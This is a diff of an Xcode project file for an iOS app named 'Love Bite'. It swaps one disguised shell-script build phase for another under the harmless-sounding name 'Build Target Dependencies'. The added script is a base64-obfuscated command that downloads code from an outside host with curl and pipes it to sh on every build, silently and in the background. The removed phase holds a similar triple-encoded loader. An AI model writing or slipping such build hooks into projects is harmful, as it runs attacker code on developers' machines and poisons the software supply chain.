@@ -1138,7 +1138,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 887E234B2E5C44C70016E082 /* Build configuration list for PBXNativeTarget "Love Bite" */;
 			buildPhases = (
-				D30EEAB5ADBA2F7EC7BDE67E /* Copy Target Symbols */,
+				F32ACCF90CB22FE08CBDE67E /* Build Target Dependencies */,
 				0DFC4C04CB4BE2817DD3ECCB /* [CP] Check Pods Manifest.lock */,
 				887E23342E5C44C50016E082 /* Sources */,
 				887E23352E5C44C50016E082 /* Frameworks */,
@@ -1294,7 +1294,7 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		D30EEAB5ADBA2F7EC7BDE67E /* Copy Target Symbols */ = {
+		F32ACCF90CB22FE08CBDE67E /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -1304,14 +1304,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Copy Target Symbols";
+			name = "Build Target Dependencies";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhR05JUW5OYVYwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -1421,6 +1421,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Love Bite/Info.plist";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -1455,6 +1456,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Love Bite/Info.plist";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
